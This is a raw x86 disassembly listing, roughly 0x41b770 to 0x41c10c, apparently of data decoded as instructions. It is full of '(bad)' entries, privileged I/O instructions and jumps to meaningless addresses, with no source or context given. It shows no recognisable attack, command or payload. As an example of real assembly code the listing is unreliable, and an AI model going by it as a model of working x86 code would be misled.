  41b770:	lea    esi,[esi-0x2fa4b8d7]
  41b776:	and    DWORD PTR [edi+0x74ba93d0],ebx
  41b77c:	sub    eax,0xe5ceae03
  41b781:	jae    0x41b769
  41b783:	shr    BYTE PTR [eax+0x52],cl
  41b786:	cmp    ah,al
  41b788:	and    dh,dh
  41b78a:	xchg   edi,eax
  41b78b:	jp     0x41b798
  41b78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b78e:	push   edx
  41b78f:	mov    eax,0x35bf5288
  41b794:	adc    DWORD PTR [eax-0x59],esp
  41b797:	stos   BYTE PTR es:[edi],al
  41b798:	test   DWORD PTR [ecx-0x13059d00],ecx
  41b79e:	arpl   WORD PTR [ebp-0x49fc6e6e],dx
  41b7a4:	scas   eax,DWORD PTR es:[edi]
  41b7a5:	sti    
  41b7a6:	push   ds
  41b7a7:	fsub   QWORD PTR [eax+0x19]
  41b7aa:	jns    0x41b7a5
  41b7ac:	push   cs
  41b7ad:	out    dx,eax
  41b7ae:	add    al,0xf6
  41b7b0:	mov    esi,0xe2a92cb
  41b7b5:	into   
  41b7b6:	loop   0x41b781
  41b7b8:	clc    
  41b7b9:	ins    BYTE PTR es:[edi],dx
  41b7ba:	stc    
  41b7bb:	aam    0x1b
  41b7bd:	sbb    eax,0x610a04f
  41b7c2:	and    DWORD PTR [ebp-0x1286e05d],0x21
  41b7c9:	(bad)  
  41b7ca:	jp     0x41b83c
  41b7cc:	jbe    0x41b763
  41b7ce:	aaa    
  41b7cf:	inc    esi
  41b7d0:	stos   BYTE PTR es:[edi],al
  41b7d1:	jns    0x41b83d
  41b7d3:	push   ebp
  41b7d4:	adc    al,0x9b
  41b7d6:	sbb    dh,cl
  41b7d8:	xor    al,BYTE PTR [esi]
  41b7da:	(bad)
  41b7dd:	ficomp WORD PTR [eax-0x49]
  41b7e0:	cdq    
  41b7e1:	inc    ecx
  41b7e2:	cli    
  41b7e3:	xchg   esi,eax
  41b7e4:	sbb    eax,0xaa53bafa
  41b7e9:	adc    BYTE PTR [ebp+0x38db4dfa],bl
  41b7ef:	push   DWORD PTR [ebx+0x1a]
  41b7f2:	jae    0x41b7ab
  41b7f4:	jno    0x41b7fc
  41b7f6:	cmc    
  41b7f7:	mov    bh,0x76
  41b7f9:	add    eax,0x5c2457d0
  41b7fe:	dec    esi
  41b7ff:	push   edx
  41b800:	arpl   WORD PTR [esi],sp
  41b802:	xchg   ebp,eax
  41b803:	fst    QWORD PTR [ebp-0x18]
  41b806:	mov    cl,0xc3
  41b808:	add    bl,0x72
  41b80b:	dec    edi
  41b80c:	add    BYTE PTR [esi-0x6a],dh
  41b80f:	in     eax,0x9c
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xa4
  41b881:	pop    edx
  41b882:	cmp    ah,BYTE PTR [ecx+esi*2+0x5000124]
  41b889:	add    DWORD PTR [eax],eax
  41b88b:	add    BYTE PTR [ebp-0x39],dh
  41b88e:	hlt    
  41b88f:	mov    ecx,ecx
  41b891:	nop
  41b892:	adc    ch,dl
  41b894:	mov    esp,0x2276c9ca
  41b899:	in     al,0x7d
  41b89b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b89c:	or     al,BYTE PTR [edi+eiz*2]
  41b89f:	adc    al,0x70
  41b8a1:	in     eax,dx
  41b8a2:	jb     0x41b900
  41b8a4:	xor    dh,0x9
  41b8a7:	mov    BYTE PTR [ecx],bl
  41b8a9:	loope  0x41b849
  41b8ab:	pop    es
  41b8ac:	ds out 0xc6,eax
  41b8af:	push   cs
  41b8b0:	fcmovnu st,st(3)
  41b8b2:	clc    
  41b8b3:	(bad)  
  41b8b4:	cmp    bl,bh
  41b8b6:	push   ebp
  41b8b7:	pop    esp
  41b8b8:	xchg   DWORD PTR [ebx+0x7e],ecx
  41b8bb:	pop    ebp
  41b8bc:	pushf  
  41b8bd:	popf   
  41b8be:	pop    ebx
  41b8bf:	mov    ecx,0x45ad6f78
  41b8c4:	sbb    BYTE PTR [edx+0x70c7e177],dh
  41b8ca:	pop    eax
  41b8cb:	(bad)  
  41b8cc:	push   0x4676f21a
  41b8d1:	inc    esi
  41b8d2:	mov    al,BYTE PTR [esi-0x1618f2b6]
  41b8d8:	mov    ds:0xba0dc88a,al
  41b8dd:	add    al,0x5f
  41b8df:	test   eax,0x6e931818
  41b8e4:	inc    ebx
  41b8e5:	sub    DWORD PTR [esi+ecx*8],edi
  41b8e8:	cmp    DWORD PTR [edx],esp
  41b8ea:	(bad)  
  41b8eb:	in     al,dx
  41b8ec:	jo     0x41b947
  41b8ee:	pop    eax
  41b8ef:	(bad)  
  41b8f0:	ficom  DWORD PTR [ebp+esi*2+0x339c8670]
  41b8f7:	lahf   
  41b8f8:	lock mov ch,0x7e
  41b8fb:	mov    ebp,0xec247cc8
  41b900:	inc    ecx
  41b901:	test   eax,0xe69674f
  41b906:	out    0x27,al
  41b908:	mov    ebp,0x2f661392
  41b90d:	fdivr  st(5),st
  41b90f:	call   0x83b9e473
  41b914:	(bad)  
  41b915:	push   ebp
  41b916:	dec    edi
  41b917:	mov    ah,0x5f
  41b919:	jno    0x41b8ee
  41b91b:	pop    esp
  41b91c:	mov    eax,ds:0x43ed8da6
  41b921:	rol    esp,cl
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	out    0x9a,al
  41b926:	pop    edx
  41b927:	sub    eax,0xdb0c13d8
  41b92c:	ret    
  41b92d:	jbe    0x41b960
  41b92f:	jnp    0x41b904
  41b931:	fstp   TBYTE PTR [edx]
  41b933:	mov    bl,0xdb
  41b935:	aas    
  41b936:	xchg   ebp,eax
  41b937:	out    0x9b,al
  41b939:	pop    ebx
  41b93a:	pop    ebx
  41b93b:	imul   ecx,DWORD PTR [edi-0x36],0xfffffff9
  41b93f:	(bad)  
  41b940:	rcl    ah,cl
  41b942:	pop    ebx
  41b943:	jns    0x41b91e
  41b945:	and    dl,al
  41b947:	test   BYTE PTR [esi+eax*8+0x1],al
  41b94b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b94c:	int    0x1c
  41b94e:	(bad)  
  41b94f:	in     eax,dx
  41b950:	lds    ebp,FWORD PTR [edi+eiz*4+0x4ac43cf4]
  41b957:	int3   
  41b958:	pop    edi
  41b959:	xchg   BYTE PTR [ecx],dl
  41b95b:	mov    ah,0x65
  41b95d:	mov    edx,?
  41b95f:	pop    ecx
  41b960:	daa    
  41b961:	pop    es
  41b962:	push   ebx
  41b963:	xchg   ecx,eax
  41b964:	pushf  
  41b965:	idiv   BYTE PTR [edi-0x61]
  41b968:	mov    al,ch
  41b96a:	jnp    0x41b90f
  41b96c:	bound  esi,QWORD PTR [ecx]
  41b96e:	xchg   edx,eax
  41b96f:	push   esi
  41b970:	and    dl,BYTE PTR ds:0x882af30b
  41b976:	push   ecx
  41b977:	adc    DWORD PTR [eax+0x543d1e54],ecx
  41b97d:	jnp    0x41b984
  41b97f:	mov    DWORD PTR [ebx],esp
  41b981:	call   FWORD PTR [ebx-0x5c20d382]
  41b987:	pcmpeqw mm0,mm5
  41b98a:	test   eax,0x7623bc1
  41b98f:	adc    dh,BYTE PTR [ebx+0x0]
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	cmp    esp,DWORD PTR [esi+ecx*4+0x125769a]
  41ba07:	add    BYTE PTR ds:0xf3000001,al
  41ba0d:	and    dl,BYTE PTR [edi]
  41ba0f:	clc    
  41ba10:	or     al,0x7f
  41ba12:	(bad)  
  41ba13:	lock dec edx
  41ba15:	mov    eax,ds:0xaee4fcf8
  41ba1a:	pop    esi
  41ba1b:	cmp    esi,DWORD PTR ds:0x3c6e9c1e
  41ba21:	in     al,dx
  41ba22:	cmp    eax,0x714ad791
  41ba27:	adc    al,0x13
  41ba29:	ret    0x2a52
  41ba2c:	daa    
  41ba2d:	dec    esp
  41ba2e:	adc    DWORD PTR [edi+0x535d5033],esp
  41ba34:	pusha  
  41ba35:	mov    eax,DWORD PTR [esi-0x38]
  41ba38:	mov    al,0xda
  41ba3a:	mov    al,BYTE PTR [edx-0x3cd9f17a]
  41ba40:	mov    ss,edx
  41ba42:	test   eax,0x5bff30b2
  41ba47:	sbb    DWORD PTR [edx],esi
  41ba49:	add    eax,0xa83afbc5
  41ba4e:	sub    BYTE PTR [ebx],bl
  41ba50:	xlat   BYTE PTR ds:[ebx]
  41ba51:	repnz or DWORD PTR [ebx-0x52fa0e65],edi
  41ba58:	adc    ebx,DWORD PTR [ecx+0x7e]
  41ba5b:	mov    esi,0x8ee09ec0
  41ba60:	jns    0x41ba75
  41ba62:	jb     0x41ba5f
  41ba64:	inc    esi
  41ba65:	jns    0x41ba61
  41ba67:	xchg   esp,eax
  41ba68:	and    edx,DWORD PTR [edx+0x1e89cd9d]
  41ba6e:	fsubr  st(7),st
  41ba70:	mov    dl,0x82
  41ba72:	dec    edx
  41ba73:	fidiv  DWORD PTR [esi+0x61]
  41ba76:	and    DWORD PTR [esi],edx
  41ba78:	jecxz  0x41ba62
  41ba7a:	adc    BYTE PTR [edi+0x75],0x6d
  41ba7e:	int3   
  41ba7f:	cmp    bl,ch
  41ba81:	imul   esp,DWORD PTR [ebx+0x74d200f7],0x52
  41ba88:	sbb    eax,DWORD PTR [edx+0x76]
  41ba8b:	std    
  41ba8c:	enter  0xa6f5,0xe3
  41ba90:	pop    es
  41ba91:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41ba93:	retf   
  41ba94:	cld    
  41ba95:	pop    eax
  41ba96:	cmp    edx,esi
  41ba98:	rol    DWORD PTR [edx+edx*8+0x389650a9],0x7f
  41baa0:	call   0x49162547
  41baa5:	push   ss
  41baa6:	push   0x4af7d57f
  41baab:	pop    esp
  41baac:	fwait
  41baad:	jns    0x41ba68
  41baaf:	inc    ecx
  41bab0:	fdivr  QWORD PTR [ecx-0x2d72eddc]
  41bab6:	dec    ebx
  41bab7:	inc    ebx
  41bab8:	xor    cl,ah
  41baba:	mov    esp,0x8bab0fde
  41babf:	push   0x34
  41bac1:	push   ss
  41bac2:	adc    DWORD PTR [esi+0x53],ebx
  41bac5:	cmc    
  41bac6:	cli    
  41bac7:	mov    eax,ds:0x78117205
  41bacc:	jecxz  0x41bb4c
  41bace:	xchg   esp,eax
  41bacf:	push   eax
  41bad0:	in     al,0xb6
  41bad2:	stc    
  41bad3:	stc    
  41bad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad5:	stc    
  41bad6:	sbb    dh,dh
  41bad8:	xchg   esi,eax
  41bad9:	inc    edi
  41bada:	std    
  41badb:	cli    
  41badc:	inc    ebx
  41badd:	adc    dl,al
  41badf:	test   eax,0xbbce8e14
  41bae4:	inc    edi
  41bae5:	mov    ebx,0x6e97438
  41baea:	mov    WORD PTR [edi],cs
  41baec:	and    cl,bh
  41baee:	jnp    0x41bb00
  41baf0:	mov    ebp,0x5d64dc64
  41baf5:	loop   0x41bb04
  41baf7:	scas   al,BYTE PTR es:[edi]
  41baf8:	jne    0x41bafb
  41bafa:	out    dx,al
  41bafb:	popf   
  41bafc:	jle    0x41bb25
  41bafe:	fadd   st(3),st
  41bb00:	mov    dl,BYTE PTR [esi+0x2b]
  41bb03:	sub    ah,BYTE PTR [esi+0x38ac85c2]
  41bb09:	push   es
  41bb0a:	push   edi
  41bb0b:	dec    ebx
  41bb0c:	push   0xfffffffb
  41bb0e:	mov    al,ds:0xac78
	...
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x6b],cx
  41bb81:	retf   0x5048
  41bb84:	jnp    0x41bbac
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0xe1000001
  41bb8d:	inc    eax
  41bb8e:	scas   eax,DWORD PTR es:[edi]
  41bb8f:	inc    ecx
  41bb90:	int3   
  41bb91:	sub    ah,ah
  41bb93:	sbb    BYTE PTR [esi],ah
  41bb95:	call   DWORD PTR [edx+0x375b05f9]
  41bb9b:	and    esp,DWORD PTR [ebx+0x405719e]
  41bba1:	sub    dh,BYTE PTR [edi+ebp*4]
  41bba4:	ret    
  41bba5:	fdivr  DWORD PTR [ecx+ecx*4+0xc70eee2]
  41bbac:	(bad)
  41bbb0:	mov    esp,0x3681c1a9
  41bbb5:	add    ecx,ebp
  41bbb7:	dec    ebx
  41bbb8:	xchg   DWORD PTR [ebx+0x22caa3da],esi
  41bbbe:	cs in  al,dx
  41bbc0:	sar    DWORD PTR [esi+0x744d53d2],1
  41bbc6:	xchg   esp,eax
  41bbc7:	test   al,0x24
  41bbc9:	mov    edi,0xb044342f
  41bbce:	loopne 0x41bb97
  41bbd0:	mov    al,ds:0x62a0015e
  41bbd5:	test   BYTE PTR [esi-0x34ea1acd],cl
  41bbdb:	ss ds inc ebx
  41bbde:	xchg   edi,eax
  41bbdf:	stos   DWORD PTR es:[edi],eax
  41bbe0:	les    edx,FWORD PTR [eax]
  41bbe2:	mov    eax,0xc175a9d
  41bbe7:	cmp    esp,DWORD PTR [edi]
  41bbe9:	cmp    DWORD PTR [ebp-0x30ecbf3d],0xfffffffe
  41bbf0:	nop
  41bbf1:	in     eax,dx
  41bbf2:	push   ss
  41bbf3:	cmp    eax,0xa996d960
  41bbf8:	call   0x88c27d02
  41bbfd:	mov    edx,0x94454e93
  41bc02:	or     al,0x44
  41bc04:	out    0x8c,eax
  41bc06:	mov    esp,0x93d8f110
  41bc0b:	xor    BYTE PTR [esi+0x4fc2e8e0],ch
  41bc11:	jecxz  0x41bc5a
  41bc13:	jmp    0x3f7c17cf
  41bc18:	and    eax,0x2d944fcc
  41bc1d:	mov    DWORD PTR [ecx+ecx*8+0x523d2545],ecx
  41bc24:	les    ebx,FWORD PTR [edi]
  41bc26:	cmp    al,0x5f
  41bc28:	retf   
  41bc29:	test   al,0x68
  41bc2b:	mov    ebx,0x27aa11f0
  41bc30:	int    0xb9
  41bc32:	jbe    0x41bbe4
  41bc34:	mov    ds:0xf5fdd0ec,eax
  41bc39:	data16 ins BYTE PTR es:[edi],dx
  41bc3b:	or     DWORD PTR [bp+si],ecx
  41bc3e:	cmp    eax,0x89d44b19
  41bc43:	(bad)  
  41bc44:	retf   
  41bc45:	dec    ebp
  41bc46:	sbb    esi,DWORD PTR [edi-0x7e]
  41bc49:	mov    dl,0x47
  41bc4b:	scas   eax,DWORD PTR es:[edi]
  41bc4c:	int    0x51
  41bc4e:	or     esp,ecx
  41bc50:	lds    esp,FWORD PTR [ebp-0x18f1f86c]
  41bc56:	push   ss
  41bc57:	sub    eax,0xdfc3a6c2
  41bc5c:	jns    0x41bc10
  41bc5e:	out    0x5b,al
  41bc60:	cmp    esi,DWORD PTR [edx+edi*1]
  41bc63:	test   eax,0xac7c3cd7
  41bc68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc69:	cli    
  41bc6a:	mov    ebx,0x27b92c4c
  41bc6f:	jge    0x41bcb9
  41bc71:	cli    
  41bc72:	and    ebx,DWORD PTR [esi-0x1816d9e]
  41bc78:	dec    ecx
  41bc79:	sub    eax,0xdc006e7c
  41bc7e:	mov    al,0x36
  41bc80:	or     BYTE PTR [edi+0x7467dbfc],bl
  41bc86:	jg     0x41bc0c
  41bc88:	mov    bh,0x76
  41bc8a:	test   eax,0xa796f64f
  41bc8f:	adc    cl,BYTE PTR [edx]
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x36f5d9d8
  41bd02:	jmp    0x41bcea
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0xed000001,al
  41bd0d:	outs   dx,DWORD PTR ds:[esi]
  41bd0e:	dec    ebp
  41bd0f:	dec    esp
  41bd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd11:	xchg   BYTE PTR [ebx],dh
  41bd13:	sbb    al,0xd6
  41bd15:	adc    DWORD PTR [ebp+edx*8-0x37],esi
  41bd19:	cmp    bl,BYTE PTR [esi]
  41bd1b:	cmp    edi,DWORD PTR [eax-0x5a]
  41bd1e:	cli    
  41bd1f:	retf   0x13a0
  41bd22:	xlat   BYTE PTR ds:[ebx]
  41bd23:	jns    0x41bd79
  41bd25:	shl    DWORD PTR [ebx+0x6be213af],0xcc
  41bd2c:	pop    edi
  41bd2d:	scas   eax,DWORD PTR es:[edi]
  41bd2e:	lds    edi,FWORD PTR [ebx+0x43]
  41bd31:	or     eax,ebp
  41bd33:	imul   eax,DWORD PTR [edx-0x7b],0x41
  41bd37:	inc    edi
  41bd38:	push   edi
  41bd39:	(bad)  
  41bd3a:	xor    DWORD PTR [esi],eax
  41bd3c:	push   0xde289f42
  41bd41:	inc    esp
  41bd42:	add    al,0xce
  41bd44:	std    
  41bd45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd46:	sbb    eax,0x89d17538
  41bd4b:	add    al,0xa5
  41bd4d:	inc    esi
  41bd4e:	xchg   edi,eax
  41bd4f:	or     al,0x99
  41bd51:	out    0xc5,eax
  41bd53:	out    0xdc,al
  41bd55:	fisttp DWORD PTR [eax]
  41bd57:	scas   al,BYTE PTR es:[edi]
  41bd58:	pop    edi
  41bd59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd5a:	ror    DWORD PTR [edx],1
  41bd5c:	int3   
  41bd5d:	dec    eax
  41bd5e:	push   esi
  41bd5f:	(bad)  
  41bd60:	repnz lods eax,DWORD PTR ds:[esi]
  41bd62:	icebp  
  41bd63:	or     eax,edi
  41bd65:	sbb    DWORD PTR [ecx-0x4dd1b152],esp
  41bd6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd6c:	mov    esi,0xa23932f6
  41bd71:	(bad)  
  41bd72:	dec    esp
  41bd73:	adc    eax,0xc
  41bd76:	dec    esp
  41bd77:	rcr    DWORD PTR [edi],cl
  41bd79:	add    ch,ch
  41bd7b:	cld    
  41bd7c:	xchg   ebp,eax
  41bd7d:	dec    ecx
  41bd7e:	je     0x41bd1a
  41bd80:	push   0xffffffb9
  41bd82:	scas   al,BYTE PTR es:[edi]
  41bd83:	and    al,BYTE PTR [ecx+0x3c6c359e]
  41bd89:	aaa    
  41bd8a:	xchg   ebp,eax
  41bd8b:	fnstcw WORD PTR [ecx+0x1f]
  41bd8e:	cli    
  41bd8f:	sub    eax,0xe323fb2e
  41bd94:	popa   
  41bd95:	in     eax,dx
  41bd96:	sub    edx,DWORD PTR [ebx+edx*2]
  41bd99:	sbb    eax,0xa86330d5
  41bd9e:	xchg   esp,eax
  41bd9f:	rol    eax,1
  41bda1:	sbb    esp,esp
  41bda3:	inc    eax
  41bda4:	sbb    BYTE PTR [esi],dl
  41bda6:	xor    eax,0x17c3fd8
  41bdab:	xchg   edx,eax
  41bdac:	fcmovu st,st(4)
  41bdae:	or     dl,dh
  41bdb0:	setp   BYTE PTR [edi-0x2c]
  41bdb4:	scas   al,BYTE PTR es:[edi]
  41bdb5:	icebp  
  41bdb6:	das    
  41bdb7:	fidiv  DWORD PTR [edi-0x51fbd2df]
  41bdbd:	aaa    
  41bdbe:	ja     0x41be38
  41bdc0:	sbb    eax,0x803eabf9
  41bdc5:	mov    ch,0xbc
  41bdc7:	sub    eax,0xf382f611
  41bdcc:	mov    edx,0x5f691ce7
  41bdd1:	or     edi,ecx
  41bdd3:	xchg   DWORD PTR ds:0xe125c4a9,eax
  41bdd9:	push   esi
  41bdda:	div    DWORD PTR [edi-0x4aef3237]
  41bde0:	cmp    DWORD PTR [esi+0x54],esi
  41bde3:	and    dl,BYTE PTR [ebp+0x72]
  41bde6:	cwde   
  41bde7:	ret    0xb86b
  41bdea:	xor    ebx,DWORD PTR [edi+0x2a]
  41bded:	icebp  
  41bdee:	sbb    BYTE PTR [ecx+0x434827d],0xa5
  41bdf5:	sub    dh,BYTE PTR [edi+edi*4]
  41bdf8:	sub    eax,0xe572040d
  41bdfd:	or     bh,BYTE PTR [ebx]
  41bdff:	mov    BYTE PTR [edx-0x30652b27],dh
  41be05:	aam    0xb6
  41be07:	loopne 0x41be14
  41be09:	adc    DWORD PTR [ebp+0x2ac5c749],0x4bd1
	...
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x4a40c09a]
  41be82:	mov    bl,0x96
  41be84:	test   DWORD PTR [eax],ebp
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    eax,0xab000001
  41be8d:	ja     0x41bee8
  41be8f:	inc    ebx
  41be90:	push   esi
  41be91:	outs   dx,BYTE PTR ds:[esi]
  41be92:	outs   dx,BYTE PTR ds:[esi]
  41be93:	pop    ss
  41be94:	push   esi
  41be95:	rcr    DWORD PTR ds:0x2c37c610,cl
  41be9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be9c:	(bad)  
  41be9d:	std    
  41be9e:	je     0x41be3b
  41bea0:	push   edi
  41bea1:	cwde   
  41bea2:	loope  0x41bef8
  41bea4:	popa   
  41bea5:	sbb    eax,0xa7c77ad1
  41beaa:	jo     0x41bef0
  41beac:	push   edi
  41bead:	sbb    ecx,0xffffffab
  41beb0:	push   ecx
  41beb1:	inc    ecx
  41beb2:	push   ds
  41beb3:	mov    edx,0x8ef2081b
  41beb8:	push   esp
  41beb9:	or     eax,0x5f543b58
  41bebe:	mov    ebp,0xc4df0491
  41bec3:	pushf  
  41bec4:	out    dx,eax
  41bec5:	pop    DWORD PTR [ebp+ebp*1-0x11038030]
  41becc:	jmp    0x4ee5752d
  41bed1:	scas   eax,DWORD PTR es:[edi]
  41bed2:	aaa    
  41bed3:	jmp    0x41beb8
  41bed5:	in     al,0x62
  41bed7:	pop    ebx
  41bed8:	sbb    BYTE PTR [edi],dh
  41beda:	sub    bl,0x70
  41bedd:	clc    
  41bede:	inc    esp
  41bedf:	es sub eax,0xf3673873
  41bee5:	ja     0x41bf32
  41bee7:	fisubr WORD PTR [eax+0x58]
  41beea:	std    
  41beeb:	sub    cl,ch
  41beed:	sub    BYTE PTR [ebp+eiz*4+0x5c4421b7],0x89
  41bef5:	add    al,0xfa
  41bef7:	or     eax,0xa570f1b3
  41befc:	sbb    al,BYTE PTR [edx-0x70f5c9fa]
  41bf02:	jecxz  0x41bf58
  41bf04:	gs jne 0x41beae
  41bf07:	das    
  41bf08:	mov    bl,0x4c
  41bf0a:	push   edi
  41bf0b:	xchg   ecx,eax
  41bf0c:	and    al,0xb9
  41bf0e:	lea    ebx,[ecx]
  41bf10:	dec    ecx
  41bf11:	out    dx,eax
  41bf12:	or     DWORD PTR [ebp+0x3d],edx
  41bf15:	xor    eax,0x77881ddb
  41bf1a:	std    
  41bf1b:	adc    BYTE PTR [eax],bl
  41bf1d:	out    0x34,eax
  41bf1f:	xchg   DWORD PTR [edi+0x60],ebp
  41bf22:	das    
  41bf23:	push   ebx
  41bf24:	clc    
  41bf25:	xchg   esi,eax
  41bf26:	dec    eax
  41bf27:	mov    dl,0xc0
  41bf29:	hlt    
  41bf2a:	shl    BYTE PTR [esi],0x22
  41bf2d:	xchg   edi,eax
  41bf2e:	dec    DWORD PTR [ebx]
  41bf30:	push   cs
  41bf31:	mov    bh,0xf8
  41bf33:	shl    ebp,0xbd
  41bf36:	cs sbb eax,0xa4c6be27
  41bf3c:	cmp    BYTE PTR [edi+0x4e6501f9],ah
  41bf42:	push   es
  41bf43:	mov    esi,0xe5ac1552
  41bf48:	repz cmp DWORD PTR [edi],edx
  41bf4b:	add    DWORD PTR [ebx],esi
  41bf4d:	sub    eax,0xf144e3d3
  41bf52:	outs   dx,DWORD PTR ds:[esi]
  41bf53:	call   0x8d8f574c
  41bf58:	enter  0xbb57,0x10
  41bf5c:	fimul  WORD PTR [esi*4+0x5f1cdde1]
  41bf63:	sub    eax,0xd2fa2e7c
  41bf68:	int3   
  41bf69:	and    DWORD PTR [edi+0x3],ebx
  41bf6c:	ss jg  0x41bf52
  41bf6f:	sbb    BYTE PTR [edx+ebx*8],0x86
  41bf73:	dec    esi
  41bf74:	pop    ebp
  41bf75:	jne    0x41bfbc
  41bf77:	mov    al,ds:0x377ba5d6
  41bf7c:	(bad)  
  41bf7d:	jge    0x41bfa8
  41bf7f:	test   DWORD PTR [edi+0x72],esp
  41bf82:	sar    ch,0x4a
  41bf85:	xchg   edi,eax
  41bf86:	fimul  DWORD PTR [ebp-0x2848b885]
  41bf8c:	cdq    
  41bf8d:	ret    
  41bf8e:	fdiv   st(4),st
  41bf90:	inc    ebp
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	imul   ecx,DWORD PTR [ebx+0x298ad8b8],0x1
  41c007:	add    BYTE PTR ds:0x1b000001,al
  41c00d:	pop    eax
  41c00e:	adc    DWORD PTR [ecx+0xc824a03],edi
  41c014:	in     eax,0xf8
  41c016:	fisttp QWORD PTR [edx-0x25]
  41c019:	ss cdq 
  41c01b:	mov    esp,0xf911c8aa
  41c020:	jecxz  0x41c045
  41c022:	or     BYTE PTR [edi+0xd],0x47
  41c026:	inc    ebp
  41c027:	sub    bl,BYTE PTR [edx-0xa]
  41c02a:	int3   
  41c02b:	mov    cl,0x4f
  41c02d:	aaa    
  41c02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c02f:	push   es
  41c030:	clts   
  41c032:	and    al,0xdc
  41c034:	xchg   ecx,eax
  41c035:	pop    ecx
  41c036:	fsubr  DWORD PTR [esi-0x9]
  41c039:	pop    esi
  41c03a:	es mov edx,0xb1da4f43
  41c040:	or     ebp,DWORD PTR [ecx+0x7e]
  41c043:	hlt    
  41c044:	push   edx
  41c045:	xor    al,0x85
  41c047:	cli    
  41c048:	retf   0xd69
  41c04b:	call   0x7b38:0xc1e565c3
  41c052:	fdiv   QWORD PTR [ecx+0x5847b2e1]
  41c058:	adc    BYTE PTR [esi-0x10],al
  41c05b:	cs inc ebx
  41c05d:	leave  
  41c05e:	mov    bh,0x6c
  41c060:	dec    ebx
  41c061:	sub    eax,0xfd0dd4e5
  41c066:	xor    BYTE PTR [eax+0x23f8af71],0x4b
  41c06d:	stc    
  41c06e:	sbb    al,0x93
  41c070:	pop    ds
  41c071:	test   DWORD PTR [ebx+0x2a6c03df],edi
  41c077:	out    0xc4,al
  41c079:	push   esi
  41c07a:	sbb    edi,DWORD PTR [edx-0x68]
  41c07d:	xchg   ebp,eax
  41c07e:	outs   dx,DWORD PTR ds:[esi]
  41c07f:	push   ebx
  41c080:	in     eax,dx
  41c081:	cmp    al,0x5c
  41c083:	js     0x41c090
  41c085:	mov    cl,0xf0
  41c087:	mov    edx,0x2a5120a3
  41c08c:	out    0xb7,al
  41c08e:	cmp    al,0x57
  41c090:	gs push esi
  41c092:	push   esp
  41c093:	imul   edi,esi,0x15
  41c096:	pop    ds
  41c097:	xchg   edi,eax
  41c098:	push   ebp
  41c099:	ret    0x1f06
  41c09c:	hlt    
  41c09d:	sub    ecx,esp
  41c09f:	and    al,0x71
  41c0a1:	les    esp,FWORD PTR [ebx+ecx*2]
  41c0a4:	push   es
  41c0a5:	pop    esp
  41c0a6:	xor    DWORD PTR [ebp-0x69],ebp
  41c0a9:	and    ebx,DWORD PTR [ecx-0x2f]
  41c0ac:	hlt    
  41c0ad:	jg     0x41c0fa
  41c0af:	pop    ecx
  41c0b0:	call   0x5e6ef64e
  41c0b5:	rcl    al,0xe3
  41c0b8:	mov    esi,0x2962c6fc
  41c0bd:	mov    edi,0x41cf74c8
  41c0c2:	cmp    BYTE PTR ds:0x51f27371,ch
  41c0c8:	push   edx
  41c0c9:	sahf   
  41c0ca:	xor    bh,al
  41c0cc:	pop    ebp
  41c0cd:	dec    ebx
  41c0ce:	adc    al,0xc9
  41c0d0:	arpl   WORD PTR [esi-0x3a8487b4],ax
  41c0d6:	jne    0x41c0da
  41c0d8:	ficomp DWORD PTR [edi-0x26]
  41c0db:	push   ss
  41c0dc:	mov    cl,0xfa
  41c0de:	clc    
  41c0df:	loope  0x41c09a
  41c0e1:	sbb    al,0x67
  41c0e3:	and    DWORD PTR [ecx+0x8298d76],eax
  41c0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ea:	loope  0x41c085
  41c0ec:	cwde   
  41c0ed:	jecxz  0x41c16c
  41c0ef:	hlt    
  41c0f0:	ror    DWORD PTR [esi-0x417dae57],1
  41c0f6:	repz shl BYTE PTR [eax],1
  41c0f9:	popf   
  41c0fa:	add    DWORD PTR [ebx],esi
  41c0fc:	dec    edx
  41c0fd:	iret   
  41c0fe:	push   es
  41c0ff:	popa   
  41c100:	xchg   BYTE PTR [edx+0x5d],ah
  41c103:	sbb    ebx,DWORD PTR [ecx+0x45]
  41c106:	add    al,0xe3
  41c108:	dec    esi
  41c109:	jl     0x41c13d
  41c10b:	dec    esi
  41c10c:	push   ebx
